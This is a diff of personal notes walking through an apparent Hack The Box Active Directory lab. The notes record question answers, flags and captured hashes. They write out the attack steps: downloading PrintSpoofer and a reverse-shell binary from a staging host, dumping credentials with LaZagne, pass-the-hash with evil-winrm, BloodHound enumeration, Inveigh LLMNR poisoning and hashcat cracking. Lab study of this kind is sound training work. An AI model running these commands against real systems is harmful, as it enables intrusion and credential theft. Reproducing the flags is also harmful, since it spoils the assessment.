@@ -79,7 +79,12 @@ Invoke-WebRequest -URI http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\Pr
 Invoke-WebRequest -URI http://172.16.7.240:8000/shell.exe -OutFile .\rshell.exe
 
 Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. - exc3ss1ve_adm1n_r1ights! 
-scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN ->
+1) on the same shell as above wit hnt-authority\system make sure to transfer laZagne.exe over 
+2) execute laZagne to capture admin hash 
+3) get admin hash 
+4) ON HOST MACHINE -> proxychains evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+5) get flag 
+
 
 Invoke-WebRequest -URI http://172.16.7.240:8000/LaZagne.exe -OutFile .\LaZagne.exe -> make suer we are loading this to 172.16.7.60 ? i think.. this is the SQL box? 
 
@@ -90,13 +95,23 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
 
 Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
-
+1) run .\SharpHound.exe -c ALL --zipfilename enum in evil win rm session -> mvoe zip to host and open bloodhound 
+2) Find Shortest Paths to Domain Admins inside bloodhound 
+3) CT059 is answer. 
 
 proxychains xfreerdp /v:172.16.7.50 /u:BRO86 /p:Welcome! /drive:shared,/home/htb-ac-1235531/Desktop 
 
 
 Question 10 -  Crack this user's password hash and submit the cleartext password as your answer. - charlie1 
-
+1) downlaod Invoke-Inveigh.ps1 to host machione, scp it to ssh htb-student shell
+2) host python3 -m http.server on ssh htb-student 
+3) invoke-webrequest to download inveigh to evilwinrm session 
+4) on evilwinrm = Import-Module Invoke-Inveigh.ps1
+5) Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y 
+6) capture CT059 hash 
+7) copy and paste to host machien and use hashcat to crack
+8) hashcat -m 5600 cthash /usr/share/wordlists/rockyou.txt
+9) cracked -> charlie1 
 
 
 Question 11 -  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. - acLs_f0r_th3_w1n! 
